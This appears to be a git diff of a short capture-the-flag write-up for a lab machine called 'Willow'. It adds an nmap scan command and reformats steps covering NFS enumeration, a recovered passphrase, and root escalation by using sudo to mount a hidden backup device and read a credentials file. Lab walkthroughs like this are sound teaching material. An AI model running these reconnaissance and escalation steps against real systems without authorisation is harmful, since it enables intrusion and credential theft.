@@ -1,6 +1,8 @@
 # Willow
 
 ## nmap scan
+nmap -sC -sV -A IP -v
+
 INITIAL
 ```
 PORT     STATE SERVICE VERSION                                                                                                                                                                
@@ -27,9 +29,9 @@ COMMON
 ## webpage data decryption
 > REDACTED
 
-## probable username : -------------
+## probable username : REDACTED
 
-1. user.txt
+# 1. user.txt
 
 	1. search for possible nfs mounts `showmount -e IP`
 ```
@@ -75,7 +77,7 @@ passphrase: wildflower
 THM{REDACTED}
 ```
 
-2. root.txt
+# 2. root.txt
 
 	1. sudo -l shows us the following
 ```
@@ -94,9 +96,9 @@ User willow may run the following commands on willow-tree:
 	 
   4. looking for a place to mount this directory we check /mnt
   
-	5. in /mnt we find an empty directory called creds lets mount hidden_backup in there
+	1. in /mnt we find an empty directory called creds lets mount hidden_backup in there
 
-	6. sudo /bin/mount /dev/hidden_backup /mnt/creds/ ( used to mount hidden_backups into the creds directory )
+	2. sudo /bin/mount /dev/hidden_backup /mnt/creds/ ( used to mount hidden_backups into the creds directory )
 	
   5. cat /mnt/creds/creds.txt
 ```
